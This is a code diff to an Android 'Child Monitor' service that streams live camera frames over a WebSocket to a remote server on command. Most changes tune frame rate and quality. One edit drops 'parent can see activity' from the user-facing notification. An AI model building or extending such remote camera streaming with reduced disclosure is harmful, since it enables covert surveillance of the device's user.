@@ -5,6 +5,8 @@ import android.content.Context
 import android.content.Intent
 import android.graphics.ImageFormat
 import android.hardware.camera2.*
+import android.hardware.camera2.params.OutputConfiguration
+import android.hardware.camera2.params.SessionConfiguration
 import android.media.AudioFormat
 import android.media.AudioRecord
 import android.media.ImageReader
@@ -18,6 +20,7 @@ import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.asRequestBody
 import okio.ByteString.Companion.toByteString
 import java.io.File
+import java.util.concurrent.Executor
 
 class MonitoringService : Service() {
 
@@ -32,13 +35,16 @@ class MonitoringService : Service() {
     private val SAMPLE_RATE = 16000
     private val BUFFER_SIZE = AudioRecord.getMinBufferSize(
         SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT
-    ) * 4
+    ) * 2
 
     private var cameraDevice: CameraDevice? = null
     private var imageReader: ImageReader? = null
+    private var captureSession: CameraCaptureSession? = null
     private var cameraThread: HandlerThread? = null
     private var cameraHandler: Handler? = null
     private var currentCameraIndex = 0
+    private var lastFrameTime = 0L
+    private val FRAME_INTERVAL = 150L // ~6-7 fps
 
     override fun onCreate() {
         super.onCreate()
@@ -56,6 +62,7 @@ class MonitoringService : Service() {
             "stop_camera" -> stopCameraStream()
             "switch_camera" -> {
                 stopCameraStream()
+                Thread.sleep(500)
                 currentCameraIndex = if (currentCameraIndex == 0) 1 else 0
                 startCameraStream()
             }
@@ -66,7 +73,7 @@ class MonitoringService : Service() {
     private fun buildNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Child Monitor Active")
-            .setContentText("Monitoring is running — parent can see activity")
+            .setContentText("Monitoring is running")
             .setSmallIcon(android.R.drawable.ic_dialog_info)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
@@ -156,7 +163,11 @@ class MonitoringService : Service() {
         cameraThread = HandlerThread("CameraThread").also { it.start() }
         cameraHandler = Handler(cameraThread!!.looper)
 
-        wsCamera = OkHttpClient().newWebSocket(
+        val okClient = OkHttpClient.Builder()
+            .writeTimeout(0, java.util.concurrent.TimeUnit.MILLISECONDS)
+            .build()
+
+        wsCamera = okClient.newWebSocket(
             Request.Builder().url("$WS_URL?type=camera").build(),
             object : WebSocketListener() {
                 override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) {
@@ -174,30 +185,42 @@ class MonitoringService : Service() {
         val cameraList = cameraManager.cameraIdList
         val cameraId = cameraList[currentCameraIndex.coerceAtMost(cameraList.size - 1)]
 
-        // 320x240 = fast stream!
-        imageReader = ImageReader.newInstance(320, 240, ImageFormat.JPEG, 2)
+        // Small size = fast!
+        imageReader = ImageReader.newInstance(256, 192, ImageFormat.JPEG, 3)
         imageReader?.setOnImageAvailableListener({ reader ->
-            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
-            val buffer = image.planes[0].buffer
-            val bytes = ByteArray(buffer.remaining())
-            buffer.get(bytes)
+            val now = System.currentTimeMillis()
+            val image = reader.acquireLatestImage()
+            if (image == null) return@setOnImageAvailableListener
+            if (now - lastFrameTime >= FRAME_INTERVAL && isCameraLive) {
+                val buffer = image.planes[0].buffer
+                val bytes = ByteArray(buffer.remaining())
+                buffer.get(bytes)
+                webSocket.send(bytes.toByteString())
+                lastFrameTime = now
+            }
             image.close()
-            if (isCameraLive) webSocket.send(bytes.toByteString())
         }, cameraHandler)
 
         cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
             override fun onOpened(camera: CameraDevice) {
                 cameraDevice = camera
                 val surface = imageReader!!.surface
-                camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
-                    override fun onConfigured(session: CameraCaptureSession) {
-                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
-                            addTarget(surface)
-                        }.build()
-                        session.setRepeatingRequest(request, null, cameraHandler)
-                    }
-                    override fun onConfigureFailed(session: CameraCaptureSession) {}
-                }, cameraHandler)
+                camera.createCaptureSession(
+                    listOf(surface),
+                    object : CameraCaptureSession.StateCallback() {
+                        override fun onConfigured(session: CameraCaptureSession) {
+                            captureSession = session
+                            val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
+                                addTarget(surface)
+                                set(CaptureRequest.JPEG_QUALITY, 60)
+                                set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE, android.util.Range(10, 15))
+                            }.build()
+                            session.setRepeatingRequest(request, null, cameraHandler)
+                        }
+                        override fun onConfigureFailed(session: CameraCaptureSession) {}
+                    },
+                    cameraHandler
+                )
             }
             override fun onDisconnected(camera: CameraDevice) { camera.close() }
             override fun onError(camera: CameraDevice, error: Int) { camera.close() }
@@ -206,6 +229,8 @@ class MonitoringService : Service() {
 
     private fun stopCameraStream() {
         isCameraLive = false
+        captureSession?.close()
+        captureSession = null
         cameraDevice?.close()
         cameraDevice = null
         imageReader?.close()
